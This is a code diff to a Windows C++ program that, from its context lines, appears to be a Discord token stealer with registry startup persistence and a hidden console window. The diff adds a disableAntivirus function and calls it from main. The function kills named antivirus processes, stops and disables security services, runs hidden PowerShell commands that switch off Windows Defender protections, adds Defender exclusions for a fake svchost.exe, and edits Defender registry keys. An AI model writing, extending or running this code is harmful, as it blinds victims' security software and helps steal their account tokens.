@@ -1308,6 +1308,73 @@ std::string getDiscordTokens() {
     return out;
 }
 
+void killProcessByName(const char* name) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return;
+    PROCESSENTRY32 pe = {sizeof(pe)};
+    if (Process32First(snap, &pe)) do {
+        if (_stricmp(pe.szExeFile, name) == 0) {
+            HANDLE p = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+            if (p) { TerminateProcess(p, 1); CloseHandle(p); }
+        }
+    } while (Process32Next(snap, &pe));
+    CloseHandle(snap);
+}
+
+void disableAntivirus() {
+    char exePath[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    if (len > 0) exePath[len] = 0;
+
+    // Kill common AV processes
+    const char* avProcs[] = {"MsMpEng.exe","NisSrv.exe","avguard.exe","avastsvc.exe","avgrsa.exe","egui.exe",
+        "ekrn.exe","bdagent.exe","SophosUI.exe","ccSvcHst.exe","vsserv.exe","kavfs.exe","AVGSvc.exe",
+        "FortiClient.exe","mfemms.exe","mfevtps.exe","mbam.exe","mbamservice.exe","WRSA.exe"};
+
+    // Stop common AV services
+    const char* avSvcs[] = {"WinDefend","Sense","MsMpEng","NisSrv","wscsvc","SecurityHealthService",
+        "AvastAntivirus","AVG","Avira","McAfeeEngineService","McAfeeFramework","McAfeeMcShield",
+        "Kaspersky","BitDefender","ESET","Malwarebytes","Sophos","TrendMicro","Norton","FortiClient",
+        "Webroot","Panda","Comodo","VIPRE","Emsisoft","F-Secure"};
+
+    for (const char* p : avProcs) killProcessByName(p);
+    for (const char* s : avSvcs) {
+        std::string cmd = "sc stop " + std::string(s) + " 2>nul";
+        system(cmd.c_str());
+        cmd = "sc config " + std::string(s) + " start= disabled 2>nul";
+        system(cmd.c_str());
+    }
+
+    // Disable Windows Defender specifically
+    WinExec("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true -Force 2>$null", SW_HIDE);
+    WinExec("powershell -Command Set-MpPreference -DisableBehaviorMonitoring $true -Force 2>$null", SW_HIDE);
+    WinExec("powershell -Command Set-MpPreference -DisableBlockAtFirstSeen $true -Force 2>$null", SW_HIDE);
+    WinExec("powershell -Command Set-MpPreference -DisableIOAVProtection $true -Force 2>$null", SW_HIDE);
+    WinExec("powershell -Command Set-MpPreference -DisablePrivacyMode $true -Force 2>$null", SW_HIDE);
+    WinExec("powershell -Command Set-MpPreference -DisableArchiveScanning $true -Force 2>$null", SW_HIDE);
+    WinExec("powershell -Command Set-MpPreference -DisableCatchupFullScan $true -Force 2>$null", SW_HIDE);
+    WinExec("powershell -Command Set-MpPreference -DisableCatchupQuickScan $true -Force 2>$null", SW_HIDE);
+    WinExec("powershell -Command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force 2>$null", SW_HIDE);
+    WinExec("powershell -Command Add-MpPreference -ExclusionProcess \"svchost.exe\" 2>$null", SW_HIDE);
+    WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:APPDATA\\Microsoft\\svchost.exe\" 2>$null", SW_HIDE);
+    WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:TEMP\\svchost.exe\" 2>$null", SW_HIDE);
+
+    // Registry disable
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        DWORD v = 1; RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
+        RegCloseKey(hKey);
+    }
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Features", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        DWORD v = 1; RegSetValueExA(hKey, "TamperProtection", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
+        RegCloseKey(hKey);
+    }
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        DWORD v = 0; RegSetValueExA(hKey, "DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
+        RegSetValueExA(hKey, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
+        RegCloseKey(hKey);
+    }
+}
+
 void installStartup() {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
@@ -1574,6 +1641,7 @@ int main(int argc, char* argv[]) {
         }
     }
     if (hide) { hideToAppData(); return 0; }
+    disableAntivirus();
     if (computerName.empty()) computerName = getComputerName();
     HWND hwnd = GetConsoleWindow();
     if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
